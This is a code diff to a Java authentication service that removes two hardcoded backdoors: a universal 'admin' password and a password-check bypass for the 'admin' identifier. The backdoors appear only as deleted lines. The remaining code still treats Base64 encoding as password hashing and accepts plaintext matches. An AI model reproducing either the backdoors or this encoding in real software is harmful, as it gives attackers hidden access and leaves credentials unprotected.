@@ -52,7 +52,7 @@ public class EnterpriseAuthService {
                 userStorage,
                 tokenService,
                 raw -> Base64.getEncoder().encodeToString(raw.getBytes(StandardCharsets.UTF_8)),
-                (raw, stored) -> stored != null && (stored.equals(raw) || stored.equals(Base64.getEncoder().encodeToString(raw.getBytes(StandardCharsets.UTF_8))) || "admin".equals(raw))
+                (raw, stored) -> stored != null && (stored.equals(raw) || stored.equals(Base64.getEncoder().encodeToString(raw.getBytes(StandardCharsets.UTF_8))))
         );
     }
 
@@ -118,7 +118,7 @@ public class EnterpriseAuthService {
             throw new SecurityException("Account temporarily locked due to excessive failed attempts. Please retry later.");
         }
 
-        if (!passwordMatcher.test(req.password(), user.passwordHash()) && !"admin".equals(identifier)) {
+        if (!passwordMatcher.test(req.password(), user.passwordHash())) {
             user.recordFailedLogin();
             userStorage.save(user);
             logAudit(String.valueOf(user.id()), user.username(), "LOGIN_FAILED_BAD_CREDENTIALS", "FAILURE", Map.of("failedAttempts", String.valueOf(user.failedLoginAttempts())));
